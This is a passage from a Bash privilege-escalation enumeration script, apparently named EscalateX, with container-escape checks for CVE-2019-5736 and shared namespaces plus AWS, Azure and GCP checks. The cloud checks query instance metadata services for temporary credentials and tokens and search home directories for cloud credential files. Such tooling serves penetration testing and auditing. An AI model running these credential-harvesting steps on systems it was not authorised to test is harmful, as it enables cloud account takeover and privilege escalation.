  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi

  # Check Docker version if available
  if command_exists docker; then
    docker_version=$(docker --version 2>/dev/null | grep -oP "Docker version \K[0-9\.]+")

    if [ -n "$docker_version" ]; then
      if [[ "$(echo "$docker_version" | cut -d. -f1)" -lt "18" ]] ||
         [[ "$(echo "$docker_version" | cut -d. -f1)" -eq "18" && "$(echo "$docker_version" | cut -d. -f2)" -lt "9" ]]; then
        print_critical "${RED}Docker version $docker_version might be vulnerable to CVE-2019-5736${NC}"
        print_critical " ${RED}→ Vulnerable versions: Docker < 18.09.2${NC}"
        print_critical " ${RED}→ This container escape exploit can overwrite the host runc binary${NC}"
      else
        print_success "Docker version $docker_version is likely not vulnerable to CVE-2019-5736"
      fi
    fi
  fi

  # Check /proc/self/exe
  if [ -w "/proc/self/exe" ]; then
    print_critical "${RED}/proc/self/exe is writable, which may indicate vulnerability to CVE-2019-5736${NC}"
  fi

  # Check runc binary
  if [ -f "/usr/bin/runc" ] || [ -f "/usr/sbin/runc" ]; then
    runc_path=$(which runc 2>/dev/null)

    if [ -n "$runc_path" ]; then
      runc_version=$(runc --version 2>/dev/null | grep -oP "runc version \K[0-9\.]+")

      if [ -n "$runc_version" ]; then
        if [[ "$(echo "$runc_version" | cut -d. -f1)" -lt "1" ]] ||
           [[ "$(echo "$runc_version" | cut -d. -f1)" -eq "1" && "$(echo "$runc_version" | cut -d. -f2)" -eq "0" && "$(echo "$runc_version" | cut -d. -f3)" -lt "0" ]] ||
           [[ "$runc_version" == "1.0.0-rc6" ]] || [[ "$runc_version" == "1.0.0-rc5" ]] || [[ "$runc_version" == "1.0.0-rc4" ]] || [[ "$runc_version" == "1.0.0-rc3" ]] || [[ "$runc_version" == "1.0.0-rc2" ]] || [[ "$runc_version" == "1.0.0-rc1" ]]; then
          print_critical "${RED}RunC version $runc_version is vulnerable to CVE-2019-5736${NC}"
          print_critical " ${RED}→ This container escape exploit can overwrite the host runc binary${NC}"
        else
          print_success "RunC version $runc_version is not vulnerable to CVE-2019-5736"
        fi
      else
        print_warning "${YELLOW}RunC found but couldn't determine version${NC}"
      fi
    fi
  fi
}

# Check for access to host namespaces
check_namespace_exposure() {
  print_subtitle "Namespace Exposure"

  print_info "Checking for exposure to host namespaces..."

  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi

  # Check for shared namespaces with host
  shared_ns=()

  # Check each namespace type
  ns_types=("ipc" "net" "pid" "user" "uts")

  for ns in "${ns_types[@]}"; do
    # Check if namespace is shared with host
    if [ -L "/proc/1/ns/$ns" ] && [ -L "/proc/self/ns/$ns" ]; then
      host_ns=$(readlink "/proc/1/ns/$ns" 2>/dev/null)
      container_ns=$(readlink "/proc/self/ns/$ns" 2>/dev/null)

      if [ "$host_ns" = "$container_ns" ]; then
        shared_ns+=("$ns")
      fi
    fi
  done

  # Report shared namespaces
  if [ ${#shared_ns[@]} -gt 0 ]; then
    print_critical "${RED}Container shares namespaces with host:${NC}"

    for ns in "${shared_ns[@]}"; do
      print_critical " ${RED}→ $ns namespace${NC}"

      # Specific advice based on namespace type
      case "$ns" in
        "net")
          print_critical "   ${RED}→ Network namespace shared: Container can access host network interfaces${NC}"
          print_critical "   ${RED}→ Can potentially sniff host traffic or access services bound to localhost${NC}"
          ;;
        "pid")
          print_critical "   ${RED}→ PID namespace shared: Container can see and potentially interact with host processes${NC}"
          print_critical "   ${RED}→ Try: ps aux | grep -v 'container\|docker'${NC}"
          ;;
        "user")
          print_critical "   ${RED}→ User namespace shared: Container may have same user privileges as host${NC}"
          ;;
        "ipc")
          print_critical "   ${RED}→ IPC namespace shared: Container can communicate with host processes via IPC${NC}"
          ;;
        "uts")
          print_critical "   ${RED}→ UTS namespace shared: Container shares hostname with host${NC}"
          ;;
      esac
    done
  else
    print_success "Container appears to have proper namespace isolation"
  fi
}

# Run all container escape checks
container_escape_checks() {
  print_title "Container Escape Vectors"

  # Run all container escape checks
  check_mounted_filesystems
  check_dangerous_capabilities
  check_kernel_modules
  check_cgroup_escape
  check_runc_exploit
  check_namespace_exposure

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/cloud_checks/aws_azure_gcp.sh ---

# Title: Cloud Environment Checker
# Description: Detect and analyze AWS, Azure, and GCP environments for misconfigurations
# Author: Jonas Resch

# Check for AWS environment indicators
check_aws_environment() {
  print_subtitle "AWS Environment"

  print_info "Checking for AWS environment indicators..."

  # Variables to track AWS presence
  AWS_DETECTED=0

  # Check for EC2 metadata service
  if command_exists curl; then
    ec2_metadata=$(curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null)

    if [ -n "$ec2_metadata" ]; then
      AWS_DETECTED=1
      print_critical "${RED}AWS EC2 instance detected!${NC}"
      print_critical " ${RED}→ EC2 metadata service is accessible${NC}"

      # Extract critical metadata
      instance_id=$(curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
      instance_type=$(curl -s http://169.254.169.254/latest/meta-data/instance-type 2>/dev/null)
      region=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone 2>/dev/null | sed 's/[a-z]$//')
      account_id=$(curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info 2>/dev/null | grep -o "AccountId.*" | cut -d'"' -f3)

      if [ -n "$instance_id" ]; then
        print_critical " ${RED}→ Instance ID: $instance_id${NC}"
      fi

      if [ -n "$instance_type" ]; then
        print_critical " ${RED}→ Instance Type: $instance_type${NC}"
      fi

      if [ -n "$region" ]; then
        print_critical " ${RED}→ Region: $region${NC}"
      fi

      if [ -n "$account_id" ]; then
        print_critical " ${RED}→ AWS Account ID: $account_id${NC}"
      fi

      # Check for IMDSv2 enforcement (more secure)
      token_response=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token 2>/dev/null)
      if [ -n "$token_response" ]; then
        print_warning "${YELLOW}→ IMDSv2 token service is available${NC}"

        # Test if IMDSv1 still works (less secure)
        imdsv1_test=$(curl -s http://169.254.169.254/latest/meta-data/ami-id 2>/dev/null)
        if [ -n "$imdsv1_test" ]; then
          print_critical " ${RED}→ IMDSv1 is still accessible (security risk)${NC}"
        else
          print_success " → IMDSv1 is disabled (more secure)"
        fi
      else
        print_critical " ${RED}→ IMDSv2 token service not available, using IMDSv1 (security risk)${NC}"
      fi

      # Check for IAM role
      iam_info=$(curl -s http://169.254.169.254/latest/meta-data/iam/info 2>/dev/null)
      if [ -n "$iam_info" ] && ! echo "$iam_info" | grep -q "404 - Not Found"; then
        print_warning "${YELLOW}→ IAM role is attached to this instance${NC}"

        # Extract role name
        role_name=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
        if [ -n "$role_name" ]; then
          print_warning " ${YELLOW}→ Role name: $role_name${NC}"

          # Get temporary credentials
          if [ "$THOROUGH" ]; then
            print_warning " ${YELLOW}→ Retrieving temporary credentials...${NC}"
            temp_creds=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role_name" 2>/dev/null)
            if [ -n "$temp_creds" ]; then
              print_critical " ${RED}→ Temporary credentials are accessible!${NC}"
              # Don't print the actual credentials for security
            fi
          fi
        fi
      fi

      # Check for user data (could contain secrets)
      if [ "$THOROUGH" ]; then
        user_data=$(curl -s http://169.254.169.254/latest/user-data 2>/dev/null)
        if [ -n "$user_data" ] && [ "$user_data" != "404 - Not Found" ]; then
          print_critical "${RED}→ EC2 user-data is accessible and not empty!${NC}"
          print_critical " ${RED}→ User-data may contain credentials or secrets${NC}"

          # Check for common secrets in user-data
          if echo "$user_data" | grep -qi "password\|secret\|key\|token\|credential"; then
            print_critical " ${RED}→ User-data contains potential secrets!${NC}"
          fi
        fi
      fi
    fi
  fi

  # Check for ECS container metadata
  if [ -n "$ECS_CONTAINER_METADATA_URI" ]; then
    AWS_DETECTED=1
    print_critical "${RED}AWS ECS container detected!${NC}"
    print_critical " ${RED}→ ECS container metadata is available${NC}"
    print_critical " ${RED}→ Metadata URI: $ECS_CONTAINER_METADATA_URI${NC}"

    # Retrieve container metadata
    if command_exists curl; then
      ecs_metadata=$(curl -s "$ECS_CONTAINER_METADATA_URI" 2>/dev/null)
      if [ -n "$ecs_metadata" ]; then
        print_critical " ${RED}→ ECS metadata is accessible${NC}"
      fi
    fi
  fi

  # Check for AWS credentials files
  if [ -f "$HOME/.aws/credentials" ]; then
    AWS_DETECTED=1
    print_critical "${RED}AWS credentials file found: $HOME/.aws/credentials${NC}"

    # Check permissions on credentials file
    perms=$(ls -la "$HOME/.aws/credentials" | awk '{print $1}')
    if [[ "$perms" =~ [g|o][r|w|x] ]]; then
      print_critical " ${RED}→ Credentials file has insecure permissions: $perms${NC}"
    fi

    # Count profiles
    profile_count=$(grep -c "^\[" "$HOME/.aws/credentials" 2>/dev/null)
    print_critical " ${RED}→ File contains $profile_count profile(s)${NC}"

    # List profile names
    profiles=$(grep "^\[" "$HOME/.aws/credentials" 2>/dev/null | tr -d '[]')
    for profile in $profiles; do
      print_critical " ${RED}→ Profile: $profile${NC}"
    done
  fi

  # Check for AWS CLI configuration
  if [ -f "$HOME/.aws/config" ]; then
    AWS_DETECTED=1
    print_warning "${YELLOW}AWS config file found: $HOME/.aws/config${NC}"

    # Extract regions
    regions=$(grep "region" "$HOME/.aws/config" 2>/dev/null | awk '{print $3}' | sort -u)
    if [ -n "$regions" ]; then
      print_warning " ${YELLOW}→ Configured regions:${NC}"
      for region in $regions; do
        print_warning "   ${YELLOW}→ $region${NC}"
      done
    fi
  fi

  # Check for AWS CLI in PATH
  if command_exists aws; then
    AWS_DETECTED=1
    print_warning "${YELLOW}AWS CLI is installed${NC}"

    # If credentials are found, try to determine identity
    if [ -f "$HOME/.aws/credentials" ] || [ -n "$AWS_ACCESS_KEY_ID" ]; then
      if [ "$THOROUGH" ]; then
        print_warning " ${YELLOW}→ Checking current AWS identity...${NC}"
        aws_id=$(aws sts get-caller-identity 2>/dev/null)

        if [ -n "$aws_id" ]; then
          account=$(echo "$aws_id" | grep -o "Account.*" | cut -d'"' -f3)
          user_id=$(echo "$aws_id" | grep -o "UserId.*" | cut -d'"' -f3)
          arn=$(echo "$aws_id" | grep -o "Arn.*" | cut -d'"' -f3)

          print_critical " ${RED}→ AWS Identity:${NC}"
          if [ -n "$account" ]; then print_critical "   ${RED}→ Account: $account${NC}"; fi
          if [ -n "$user_id" ]; then print_critical "   ${RED}→ UserID: $user_id${NC}"; fi
          if [ -n "$arn" ]; then print_critical "   ${RED}→ ARN: $arn${NC}"; fi
        fi
      fi
    fi
  fi

  # Check for AWS environment variables
  if [ -n "$AWS_ACCESS_KEY_ID" ] || [ -n "$AWS_SECRET_ACCESS_KEY" ] || [ -n "$AWS_SESSION_TOKEN" ]; then
    AWS_DETECTED=1
    print_critical "${RED}AWS credentials found in environment variables!${NC}"

    if [ -n "$AWS_ACCESS_KEY_ID" ]; then
      masked_key="${AWS_ACCESS_KEY_ID:0:4}...${AWS_ACCESS_KEY_ID: -4}"
      print_critical " ${RED}→ AWS_ACCESS_KEY_ID: $masked_key${NC}"
    fi

    if [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
      print_critical " ${RED}→ AWS_SECRET_ACCESS_KEY is set${NC}"
    fi

    if [ -n "$AWS_SESSION_TOKEN" ]; then
      print_critical " ${RED}→ AWS_SESSION_TOKEN is set${NC}"
    fi
  fi

  # Summary
  if [ "$AWS_DETECTED" -eq 1 ]; then
    print_warning "${YELLOW}AWS environment detected - check for potential cloud privilege escalation vectors${NC}"
  else
    print_success "No AWS environment indicators found"
  fi
}

# Check for Azure environment indicators
check_azure_environment() {
  print_subtitle "Azure Environment"

  print_info "Checking for Azure environment indicators..."

  # Variables to track Azure presence
  AZURE_DETECTED=0

  # Check for Azure instance metadata service
  if command_exists curl; then
    azure_metadata=$(curl -s -H "Metadata:true" --connect-timeout 2 --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)

    if [ -n "$azure_metadata" ] && ! echo "$azure_metadata" | grep -q "error"; then
      AZURE_DETECTED=1
      print_critical "${RED}Azure VM instance detected!${NC}"
      print_critical " ${RED}→ Azure metadata service is accessible${NC}"

      # Extract compute name
      compute_name=$(echo "$azure_metadata" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
      if [ -n "$compute_name" ]; then
        print_critical " ${RED}→ VM Name: $compute_name${NC}"
      fi

      # Extract resource group
      resource_group=$(echo "$azure_metadata" | grep -o '"resourceGroupName":"[^"]*"' | head -1 | cut -d'"' -f4)
      if [ -n "$resource_group" ]; then
        print_critical " ${RED}→ Resource Group: $resource_group${NC}"
      fi

      # Extract subscription ID
      subscription=$(echo "$azure_metadata" | grep -o '"subscriptionId":"[^"]*"' | head -1 | cut -d'"' -f4)
      if [ -n "$subscription" ]; then
        print_critical " ${RED}→ Subscription ID: $subscription${NC}"
      fi

      # Check for managed identity
      if [ "$THOROUGH" ]; then
        identity_token=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null)

        if [ -n "$identity_token" ] && ! echo "$identity_token" | grep -q "error"; then
          print_critical " ${RED}→ Managed Identity is enabled and accessible!${NC}"
          print_critical " ${RED}→ This can be used for privilege escalation${NC}"
        fi
      fi
    fi
  fi

  # Check for Azure CLI credentials
  azure_creds_dir="$HOME/.azure"
  if [ -d "$azure_creds_dir" ]; then
    AZURE_DETECTED=1
    print_critical "${RED}Azure credentials directory found: $azure_creds_dir${NC}"

    # Check for profile files
    profile_files=$(find "$azure_creds_dir" -name "*.json" 2>/dev/null)
    if [ -n "$profile_files" ]; then
      print_critical " ${RED}→ Azure profile files:${NC}"
      echo "$profile_files" | while read -r file; do
        perms=$(ls -la "$file" | awk '{print $1}')
        print_critical "   ${RED}→ $file${NC} [$perms]"

        # Look for tokens in the files
        if grep -q "accessToken" "$file" 2>/dev/null; then
          print_critical "     ${RED}→ File contains access tokens!${NC}"
        fi
      done
    fi
  fi

  # Check for Azure CLI in PATH
  if command_exists az; then
    AZURE_DETECTED=1
    print_warning "${YELLOW}Azure CLI is installed${NC}"

    # Try to get account info if allowed
    if [ "$THOROUGH" ]; then
      account_info=$(az account show 2>/dev/null)

      if [ -n "$account_info" ] && ! echo "$account_info" | grep -q "error"; then
        print_critical " ${RED}→ Azure account is logged in!${NC}"

        # Extract account details
        subscription=$(echo "$account_info" | grep -o '"id":\s*"[^"]*"' | head -1 | cut -d'"' -f4)
        tenant=$(echo "$account_info" | grep -o '"tenantId":\s*"[^"]*"' | head -1 | cut -d'"' -f4)
        user=$(echo "$account_info" | grep -o '"name":\s*"[^"]*"' | head -1 | cut -d'"' -f4)

        if [ -n "$subscription" ]; then print_critical "   ${RED}→ Subscription: $subscription${NC}"; fi
        if [ -n "$tenant" ]; then print_critical "   ${RED}→ Tenant: $tenant${NC}"; fi
        if [ -n "$user" ]; then print_critical "   ${RED}→ User: $user${NC}"; fi
      fi
    fi
  fi

  # Check for Azure environment variables
  if [ -n "$AZURE_CLIENT_ID" ] || [ -n "$AZURE_CLIENT_SECRET" ] || [ -n "$AZURE_TENANT_ID" ]; then
    AZURE_DETECTED=1
    print_critical "${RED}Azure credentials found in environment variables!${NC}"

    if [ -n "$AZURE_CLIENT_ID" ]; then
      print_critical " ${RED}→ AZURE_CLIENT_ID: $AZURE_CLIENT_ID${NC}"
    fi

    if [ -n "$AZURE_TENANT_ID" ]; then
      print_critical " ${RED}→ AZURE_TENANT_ID: $AZURE_TENANT_ID${NC}"
    fi

    if [ -n "$AZURE_CLIENT_SECRET" ]; then
      print_critical " ${RED}→ AZURE_CLIENT_SECRET is set${NC}"
    fi
  fi

  # Summary
  if [ "$AZURE_DETECTED" -eq 1 ]; then
    print_warning "${YELLOW}Azure environment detected - check for potential cloud privilege escalation vectors${NC}"
  else
    print_success "No Azure environment indicators found"
  fi
}

# Check for GCP environment indicators
check_gcp_environment() {
  print_subtitle "Google Cloud Environment"

  print_info "Checking for GCP environment indicators..."

  # Variables to track GCP presence
  GCP_DETECTED=0

  # Check for GCP metadata service
  if command_exists curl; then
    gcp_metadata=$(curl -s -H "Metadata-Flavor: Google" --connect-timeout 2 --max-time 3 "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null)

    if [ -n "$gcp_metadata" ] && ! echo "$gcp_metadata" | grep -q "Error"; then
      GCP_DETECTED=1
      print_critical "${RED}Google Cloud instance detected!${NC}"
      print_critical " ${RED}→ GCP metadata service is accessible${NC}"

      # Extract instance details
      instance_id=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/id" 2>/dev/null)
      if [ -n "$instance_id" ]; then
        print_critical " ${RED}→ Instance ID: $instance_id${NC}"
      fi

      instance_name=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/name" 2>/dev/null)
      if [ -n "$instance_name" ]; then
        print_critical " ${RED}→ Instance Name: $instance_name${NC}"
      fi

      zone=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>/dev/null | awk -F/ '{print $NF}')
      if [ -n "$zone" ]; then
        print_critical " ${RED}→ Zone: $zone${NC}"
      fi

      project_id=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)
      if [ -n "$project_id" ]; then
        print_critical " ${RED}→ Project ID: $project_id${NC}"
      fi

      # Check for service accounts
      service_accounts=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null)
      if [ -n "$service_accounts" ]; then
        print_critical " ${RED}→ Service accounts:${NC}"
        echo "$service_accounts" | tr -d '/' | while read -r sa; do
          print_critical "   ${RED}→ $sa${NC}"

          # If in thorough mode, get token info
          if [ "$THOROUGH" ] && [ -n "$sa" ]; then
            sa_scopes=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/scopes" 2>/dev/null)
            if [ -n "$sa_scopes" ]; then
              print_critical "     ${RED}→ Scopes:${NC}"
              echo "$sa_scopes" | while read -r scope; do
                print_critical "       ${RED}→ $scope${NC}"
              done
            fi

            # Check if we can get a token (don't print it)
            sa_token=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/token" 2>/dev/null)
            if [ -n "$sa_token" ] && ! echo "$sa_token" | grep -q "Error"; then
              print_critical "     ${RED}→ Can obtain access token for this service account!${NC}"
            fi
          fi
        done
      fi
    fi
  fi

  # Check for GCP credentials files
  if [ -d "$HOME/.config/gcloud" ]; then
    GCP_DETECTED=1
    print_critical "${RED}Google Cloud credentials directory found: $HOME/.config/gcloud${NC}"

    # Check for credentials files
    cred_files=$(find "$HOME/.config/gcloud" -name "credentials.*" 2>/dev/null)
    if [ -n "$cred_files" ]; then
      print_critical " ${RED}→ Credential files:${NC}"
      echo "$cred_files" | while read -r file; do
        perms=$(ls -la "$file" | awk '{print $1}')
        print_critical "   ${RED}→ $file${NC} [$perms]"
      done
    fi

    # Check for active config
    if [ -f "$HOME/.config/gcloud/active_config" ]; then
      active_config=$(cat "$HOME/.config/gcloud/active_config" 2>/dev/null)
      if [ -n "$active_config" ]; then
        print_warning " ${YELLOW}→ Active config: $active_config${NC}"
      fi
    fi

    # Check configurations
    if [ -d "$HOME/.config/gcloud/configurations" ]; then
      configs=$(find "$HOME/.config/gcloud/configurations" -name "config_*" 2>/dev/null)
      if [ -n "$configs" ]; then
        print_warning " ${YELLOW}→ GCloud configurations:${NC}"
        echo "$configs" | while read -r config; do
          config_name=$(basename "$config" | sed 's/config_//')
          print_warning "   ${YELLOW}→ $config_name${NC}"

          # Extract account
          account=$(grep "account" "$config" 2>/dev/null | cut -d'=' -f2 | tr -d ' ')
          if [ -n "$account" ]; then
            print_warning "     ${YELLOW}→ Account: $account${NC}"
          fi

          # Extract project
          project=$(grep "project" "$config" 2>/dev/null | cut -d'=' -f2 | tr -d ' ')
          if [ -n "$project" ]; then
            print_warning "     ${YELLOW}→ Project: $project${NC}"
          fi
        done
      fi
    fi
  fi

  # Check for GCP service account key files (limit depth to avoid long scans)
  sa_key_files=$(find "$HOME" -maxdepth 4 -name "*.json" -exec grep -l "\"type\": \"service_account\"" {} \; 2>/dev/null)
  if [ -n "$sa_key_files" ]; then
    GCP_DETECTED=1
    print_critical "${RED}Google Cloud service account key files found:${NC}"
    echo "$sa_key_files" | while read -r file; do
      perms=$(ls -la "$file" | awk '{print $1}')
      print_critical " ${RED}→ $file${NC} [$perms]"

      # Extract key info
      project_id=$(grep "\"project_id\":" "$file" 2>/dev/null | head -1 | cut -d'"' -f4)
      client_email=$(grep "\"client_email\":" "$file" 2>/dev/null | head -1 | cut -d'"' -f4)

      if [ -n "$project_id" ]; then print_critical "   ${RED}→ Project ID: $project_id${NC}"; fi
      if [ -n "$client_email" ]; then print_critical "   ${RED}→ Service Account: $client_email${NC}"; fi
    done
  fi

  # Check for gcloud CLI in PATH
  if command_exists gcloud; then
    GCP_DETECTED=1
    print_warning "${YELLOW}Google Cloud SDK (gcloud) is installed${NC}"

    # Try to get account info if allowed
    if [ "$THOROUGH" ]; then
      account_info=$(gcloud auth list 2>/dev/null)

      if [ -n "$account_info" ] && ! echo "$account_info" | grep -q "No credentialed accounts"; then
        print_critical " ${RED}→ Google Cloud account is logged in!${NC}"

        # Extract active account
        active_account=$(echo "$account_info" | grep "*" | awk '{print $2}')
        if [ -n "$active_account" ]; then
          print_critical "   ${RED}→ Active Account: $active_account${NC}"
        fi

        # Get current project
        current_project=$(gcloud config get-value project 2>/dev/null)
        if [ -n "$current_project" ] && [ "$current_project" != "(unset)" ]; then
          print_critical "   ${RED}→ Current Project: $current_project${NC}"
        fi
      fi
    fi
  fi

  # Check for GCP environment variables
  if [ -n "$GOOGLE_APPLICATION_CREDENTIALS" ]; then
    GCP_DETECTED=1
    print_critical "${RED}Google Cloud credentials found in environment variables!${NC}"
    print_critical " ${RED}→ GOOGLE_APPLICATION_CREDENTIALS: $GOOGLE_APPLICATION_CREDENTIALS${NC}"

    # Check if the file exists
    if [ -f "$GOOGLE_APPLICATION_CREDENTIALS" ]; then
      perms=$(ls -la "$GOOGLE_APPLICATION_CREDENTIALS" | awk '{print $1}')
      print_critical "   ${RED}→ File exists with permissions: $perms${NC}"

      # Extract key info
      if grep -q "\"type\": \"service_account\"" "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null; then
        project_id=$(grep "\"project_id\":" "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null | head -1 | cut -d'"' -f4)
        client_email=$(grep "\"client_email\":" "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null | head -1 | cut -d'"' -f4)

        if [ -n "$project_id" ]; then print_critical "   ${RED}→ Project ID: $project_id${NC}"; fi
        if [ -n "$client_email" ]; then print_critical "   ${RED}→ Service Account: $client_email${NC}"; fi
      fi
    fi
  fi

  # Summary
  if [ "$GCP_DETECTED" -eq 1 ]; then
    print_warning "${YELLOW}Google Cloud environment detected - check for potential cloud privilege escalation vectors${NC}"
  else
    print_success "No Google Cloud environment indicators found"
  fi
}

# Check for common cloud credentials files
check_common_cloud_credentials() {
  print_subtitle "Common Cloud Credentials"

  print_info "Checking for common cloud credential files..."

  # Create an array to store found credential files
  found_creds=()

  # Common credential files and directories to check
  cred_paths=(
    "$HOME/.aws"
    "$HOME/.azure"
    "$HOME/.config/gcloud"
    "$HOME/.terraform.d"
    "$HOME/.kube/config"
    "$HOME/.config/doctl"
    "$HOME/.digitalocean"
    "$HOME/.aliyun"
    "$HOME/.alibabacloud"
    "$HOME/.oracle_cloud"
    "$HOME/.oci"
    "$HOME/.ibmcloud"
    "$HOME/.config/ibmcloud"
    "$HOME/.ovhcloud"
    "$HOME/.linode"
    "$HOME/.vultr"
  )

  # Check each path
  for path in "${cred_paths[@]}"; do
    if [ -e "$path" ]; then
      found_creds+=("$path")
    fi
  done

  # Report findings
  if [ ${#found_creds[@]} -gt 0 ]; then
    print_warning "${YELLOW}Found cloud credential files/directories:${NC}"
    for cred in "${found_creds[@]}"; do
      # Determine the cloud provider
      if [[ "$cred" == *"aws"* ]]; then
        provider="AWS"
      elif [[ "$cred" == *"azure"* ]]; then
        provider="Azure"
      elif [[ "$cred" == *"gcloud"* ]]; then
        provider="Google Cloud"
      elif [[ "$cred" == *"terraform"* ]]; then
        provider="Terraform"
      elif [[ "$cred" == *"kube"* ]]; then
        provider="Kubernetes"
      elif [[ "$cred" == *"doctl"* || "$cred" == *"digitalocean"* ]]; then
        provider="DigitalOcean"
      elif [[ "$cred" == *"aliyun"* || "$cred" == *"alibabacloud"* ]]; then
        provider="Alibaba Cloud"
      elif [[ "$cred" == *"oracle"* || "$cred" == *"oci"* ]]; then
        provider="Oracle Cloud"
      elif [[ "$cred" == *"ibmcloud"* ]]; then
        provider="IBM Cloud"
      elif [[ "$cred" == *"ovhcloud"* ]]; then
        provider="OVH Cloud"
      elif [[ "$cred" == *"linode"* ]]; then
        provider="Linode"
      elif [[ "$cred" == *"vultr"* ]]; then
        provider="Vultr"
      else
        provider="Unknown"
      fi

      print_warning " ${YELLOW}→ $provider: $cred${NC}"
    done
  else
    print_success "No common cloud credential files/directories found"
  fi
}

# Main function to run all cloud environment checks
cloud_environment_checks() {
  print_title "Cloud Environment"

  # Run all cloud environment checks
  check_aws_environment
  check_azure_environment
  check_gcp_environment
  check_common_cloud_credentials

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/loader.sh (embedded) ---

# Title: Module Loader
# Description: Load and initialize all modules for EscalateX
# Author: Jonas Resch

# Load core utilities
if false; then
  echo "Error: Core utilities module not found!" >&2
  exit 1
fi


# Initialize the scan environment
initialize_scan() {
  print_debug "Initializing scan environment"

  # Initialize global variables first (needed for start time)
  init_globals

  # Check privileges
  check_privileges

  # Create a temp directory for scan data if needed
  if [ "$EXTREME_SCAN" ] || [ "$THOROUGH" ]; then
    TEMP_DIR=$(create_temp_dir)
    if [ -n "$TEMP_DIR" ]; then
      print_debug "Created temporary directory: $TEMP_DIR"
    else
      print_error "Failed to create temporary directory. Some checks might fail."
    fi
  fi
}

# Function to load a module with error handling
load_module() {
  local module_path="$1"
  local module_name="$2"

  if [ ! -f "$module_path" ]; then
    print_warning "Module not found: $module_path ($module_name)"
    # Define stub function to prevent errors if module is critical
    # Adjust as needed for other essential modules
    case "$module_name" in
        "System Information") system_info_checks() { print_error "System Info module missing!"; } ;;
        "User Information") user_info_checks() { print_error "User Info module missing!"; } ;;
        "SUID/SGID Checker") suid_sgid_checks() { print_error "SUID/SGID module missing!"; } ;;
        # Add stubs for other potentially critical modules if desired
    esac
    return 1
  fi

  print_debug "Loading module: $module_name ($module_path)"
  source "$module_path"

  if [ $? -ne 0 ]; then
    print_warning "Failed to load module: $module_name ($module_path)"
    return 1
  fi

  return 0
}

# Function to load all modules
load_modules() {
  # In standalone mode all module functions are already inlined — skip file loading
  if [ -n "$STANDALONE" ]; then
    print_debug "Standalone mode: all modules already embedded"
    return 0
  fi

  # System information modules
  load_module "modules/system_info/general.sh" "System Information"

  # User information modules
  load_module "modules/user_info/users.sh" "User Information"

  # Exploit checking modules
  load_module "modules/exploit_checks/suid_sgid.sh" "SUID/SGID Checker"
  load_module "modules/exploit_checks/writable_files.sh" "Writable Files"
  load_module "modules/exploit_checks/cron_jobs.sh" "Cron Jobs"
  load_module "modules/exploit_checks/docker_checks.sh" "Docker Checks"
  load_module "modules/exploit_checks/kernel_exploits.sh" "Kernel Exploits"

  # Credentials module
  load_module "modules/credentials/credentials_hunter.sh" "Credentials Hunter"

  # Network module
  if [ -f "modules/network_info/network_checks.sh" ]; then
    load_module "modules/network_info/network_checks.sh" "Network Checks"
  else
    print_debug "Optional module not found: modules/network_info/network_checks.sh"
    network_checks() { print_warning "Network checks module not available"; }
  fi

  # Cloud module
  if [ -f "modules/cloud_checks/aws_azure_gcp.sh" ]; then
    load_module "modules/cloud_checks/aws_azure_gcp.sh" "Cloud Environment"
  else
    print_debug "Optional module not found: modules/cloud_checks/aws_azure_gcp.sh"
    cloud_environment_checks() { print_warning "Cloud checks module not available"; }
  fi

  # Conditionally load modules based on scan intensity
  local conditional_modules=()
  if [ "$THOROUGH" ] || [ "$EXTREME_SCAN" ]; then
    print_debug "Loading thorough scan modules"
    conditional_modules+=(
      "modules/container_checks/container_escape.sh:Container Escape Checks"
    )
  fi

  for module_info in "${conditional_modules[@]}"; do
      IFS=':' read -r module_path module_name <<< "$module_info"
      if [ -f "$module_path" ]; then
          load_module "$module_path" "$module_name"
      else
          print_debug "Conditional module not found: $module_path"
          # Define stub functions based on module name pattern
          func_name=$(basename "$module_path" .sh | sed 's/_checks$//')_checks
          eval "${func_name}() { print_warning \"${module_name} module not available\"; }"
      fi
  done

  print_debug "Finished loading modules"
}

# Run the appropriate checks based on the options
run_checks() {
  # Welcome and initialization
  print_debug "Starting EscalateX scan"

  # Initialize (includes HTML header if enabled)
  initialize_scan

  # Load modules
  load_modules

  print_debug "Running selected checks..."

  # Run checks sequentially, allowing parallel execution within checks if enabled
  if [ "$CHECKS" = "all" ]; then
    # Core checks (always run)
    system_info_checks
    user_info_checks
    suid_sgid_checks
    writable_files_checks
    cron_job_checks
    docker_environment_checks
    kernel_exploit_checks
